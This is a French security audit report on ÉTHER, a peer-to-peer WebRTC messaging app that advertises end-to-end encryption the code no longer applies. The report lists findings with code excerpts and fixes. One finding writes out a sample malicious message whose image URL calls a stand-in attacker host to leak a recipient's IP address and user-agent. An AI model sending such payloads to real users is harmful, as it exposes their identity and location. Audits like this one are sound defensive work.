# Audit de sécurité — ÉTHER

**Date** : 2026-09-08
**Skill** : FORTRESS v2.0
**Stack** : Client JS vanilla (ES Modules, PWA) + PeerJS/WebRTC + serveur de signalisation Express (Railway) — pas de base de données, pas de backend applicatif.
**Hébergement** : GitHub Pages (client) + Railway (signalisation, optionnel — cloud PeerJS utilisé par défaut).

## Score global : 49/100 — 🔴 STOP (corrections critiques avant de présenter l'app comme "E2E")

## Résumé exécutif

ÉTHER est propre sur les fondamentaux (pas de secret exposé, pas de `.env` commité, stockage 100% client, TTL appliqué). Le problème n'est pas une faille technique classique : **la promesse centrale du produit — le chiffrement de bout en bout — n'est plus effective pour les messages directs**, alors qu'elle est toujours annoncée dans le README, la landing page et l'UI de chat. `crypto.js` (ECDH + AES-GCM) existe mais n'est appelé nulle part dans `peer.js`/`app.js` pour les messages 1-to-1 : ils partent en clair dans le payload JSON du DataChannel, protégés uniquement par le DTLS natif de WebRTC. Pour un outil de messagerie éphémère dont l'argument de vente est justement la confidentialité, c'est le point à traiter en priorité — avant tout autre polish.

## Tableau synthétique

| # | Sévérité | Fichier | Faille |
|---|---|---|---|
| 1 | 🔴 CRITIQUE | `src/peer.js`, `src/app.js` | E2E applicatif désactivé — messages directs envoyés en clair, contrairement à ce qu'annoncent README/UI |
| 2 | 🟠 HIGH | `src/config.js` | Signalisation via cloud tiers `0.peerjs.com`, sans vérification hors-bande — MITM possible sur l'échange SDP |
| 3 | 🟠 HIGH | `src/ui.js` (181-186) | `img.src` alimenté sans validation — un pair peut faire fuiter l'IP du destinataire via une URL externe |
| 4 | 🟡 MEDIUM | `server/server.js` | Pas de Helmet, CORS ouvert (`cors()` sans origin), aucun rate limiting sur `/signal` |
| 5 | 🟡 MEDIUM | `server/package-lock.json` | Dépendance `ws` (HIGH — DoS), `qs` (moderate) via `peer` |
| 6 | 🟢 LOW | `src/groups.js` (45) | Sel PBKDF2 statique pour la clé de groupe |
| 7 | 🟢 LOW | `src/crypto.js` (60-61) | Clé privée stockée en clair (JWK) dans `localStorage` |
| 8 | 🟢 LOW | `src/groups.js` | Aucune limite de débit applicative — un membre peut flooder le groupe via le hub |

---

## Détail des failles

### 1 · E2E applicatif désactivé mais toujours annoncé [CRITIQUE]

**Fichiers** : `src/peer.js:4` (commentaire), `src/peer.js:132-135` (`send`), `src/app.js`, ainsi que `README.md:68`, `app.html:68` ("P2P · E2E · éphémère"), `index.html:88-90` ("Chiffrement de bout en bout... Impossible à intercepter").

Le commit `433d7f0` (« suppression E2E applicatif — messages plain text sur DTLS WebRTC ») a retiré l'appel à `Crypto.encrypt`/`Crypto.decrypt` pour les messages directs. `crypto.js` (ECDH P-256 + AES-GCM) reste dans le code, les clés sont générées et exportées, mais rien ne s'en sert pour chiffrer le contenu des messages 1-to-1 :

```js
// src/peer.js — code actuel
function send(text, ttl, isImage = false) {
  if (!_conn?.open) throw new Error('non connecté');
  _conn.send({ type: 'msg', text, ttl, isImage }); // texte en clair
}
```

La seule protection restante est le DTLS natif du DataChannel WebRTC (chiffrement de transport, pas applicatif). Ça reste correct entre les deux navigateurs eux-mêmes, mais ce n'est plus "E2E" au sens où l'app le vend (clé dérivée par pair, indépendante du canal, résistante à un signaling compromis — voir #2).

**Fix attendu** : rebrancher `Crypto.deriveSharedKey` (échange des clés publiques à la connexion) puis `Crypto.encrypt`/`decrypt` autour de `_conn.send`/`c.on('data')`, comme c'est déjà fait proprement pour les groupes (`groups.js`). Ou, si le retrait était volontaire (debug d'un bug de handshake), **retirer la mention "E2E" du README/UI tant que ce n'est pas réactivé** — ne jamais laisser un outil de confidentialité annoncer une protection qu'il n'applique pas.

### 2 · Signalisation cloud tierce sans vérification hors-bande [HIGH]

**Fichier** : `src/config.js:6-10`

```js
SIGNAL_HOST: '0.peerjs.com', // cloud PeerJS tiers, pas le serveur Railway
```

Le serveur de signalisation ne voit jamais le contenu des messages, mais il négocie l'échange SDP (donc les paramètres DTLS) entre les deux pairs. Sans vérification hors-bande des clés (c'est exactement ce que l'E2E applicatif désactivé au point #1 aurait permis — la clé publique ECDH aurait pu être comparée/scannée via le QR code), un opérateur de signalisation compromis ou contraint légalement peut théoriquement s'insérer en MITM sur l'établissement de connexion. Le fait de dépendre d'un service cloud tiers non contrôlé (au lieu du serveur Railway déjà prévu) aggrave l'exposition à ce scénario pour un outil dont le modèle de menace inclut justement "un tiers avec accès à l'infra".

**Fix attendu** : basculer sur le serveur Railway maîtrisé en priorité (le fallback cloud actuel semble avoir été ajouté pour stabilité, cf. commit `240d82f`), et réactiver l'E2E applicatif pour rendre un signaling compromis inoffensif sur le contenu.

### 3 · `img.src` non validé — fuite d'IP possible via un pair malveillant [HIGH]

**Fichier** : `src/ui.js:181-186`

```js
if (msg.isImage) {
  const img = document.createElement('img');
  img.src = msg.text; // aucune vérification que c'est bien un data: URI
  ...
}
```

`msg.text` provient directement du pair distant (`data.text` dans `peer.js` `_wire`). Rien n'empêche un contact malveillant d'envoyer `{ type: 'msg', isImage: true, text: 'https://attaquant.example/pixel.png?id=xyz' }` : le navigateur du destinataire va charger cette image externe, révélant son IP et son user-agent à un tiers — à l'exact opposé de la promesse "zéro trace" du produit.

**Fix attendu** : valider que `msg.text` commence par `data:image/` avant de l'assigner à `img.src` ; sinon, rejeter/afficher une erreur.

```js
if (msg.isImage) {
  if (!/^data:image\/(jpeg|png|webp);base64,/.test(msg.text)) {
    return _appendSysError('Image invalide reçue — rejetée.');
  }
  ...
}
```

### 4 · Serveur de signalisation : pas de Helmet, CORS ouvert, pas de rate limit [MEDIUM]

**Fichier** : `server/server.js`

```js
app.use(cors());              // origin non restreint
// pas de helmet()
// pas de rate limiter sur /signal
```

Risque limité (le serveur ne traite aucune donnée sensible), mais reste une bonne pratique à appliquer avant un déploiement plus exposé — surtout si le serveur Railway redevient l'option par défaut (cf. #2).

**Fix** :
```js
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
app.use(helmet());
app.use(cors({ origin: ['https://ether-app.github.io'] }));
app.use('/signal', rateLimit({ windowMs: 60_000, max: 60 }));
```

### 5 · Dépendances vulnérables [MEDIUM]

`npm audit` sur `server/` : 1 low (`body-parser`), 1 moderate (`qs`), **1 high (`ws`, DoS via en-têtes non bornés)**, toutes via la dépendance `peer`. Fix disponible via `npm audit fix` (à tester, `peer` étant tirée en transitive).

### 6 · Sel PBKDF2 statique pour la clé de groupe [LOW]

**Fichier** : `src/groups.js:45`

```js
const salt = new TextEncoder().encode('ether-group-salt'); // identique pour tous les groupes
```

Le token (6 caractères, ~31 bits d'entropie) sert de "mot de passe" PBKDF2, donc chaque groupe a bien une clé différente malgré le sel fixe — pas une faille exploitable dans l'immédiat vu le coût de 100k itérations. Mais un sel dérivé du token lui-même (`salt = sha256('ether-salt-' + token)`) coûterait rien et supprime le risque de précalcul mutualisé entre groupes.

### 7 · Clé privée en clair dans `localStorage` [LOW — accepté par design]

**Fichier** : `src/crypto.js:60-61`

Standard pour une app web sans compte serveur (comparable à d'autres outils E2E côté navigateur). À mentionner simplement dans le README comme limite connue : accès physique/malware au navigateur = usurpation d'identité possible.

### 8 · Pas de rate limiting applicatif dans un groupe [LOW]

Un membre du groupe peut envoyer en boucle via le hub, qui relaie sans limite à tous les autres — DoS mineur, cosmétique vu la taille max de 10 membres.

---

## Checklist post-fix

- [ ] Réactiver `Crypto.deriveSharedKey`/`encrypt`/`decrypt` sur les messages directs (#1) — **priorité absolue**
- [ ] Basculer signalisation par défaut sur Railway, ou documenter clairement le compromis du cloud PeerJS (#2)
- [ ] Valider `msg.text` comme `data:image/*` avant `img.src` (#3)
- [ ] Ajouter Helmet + CORS restreint + rate limit sur le serveur de signalisation (#4)
- [ ] `npm audit fix` côté `server/` (#5)
- [ ] Dériver le sel PBKDF2 du token (#6)
- [ ] Documenter la limite "clé privée en clair" dans le README (#7)

## Recommandation

Ne pas retravailler l'UI/les features tant que le point #1 n'est pas réglé : soit on réactive l'E2E applicatif, soit on retire la mention "E2E" du produit — actuellement le README et l'interface promettent une propriété de sécurité que le code ne fournit plus.
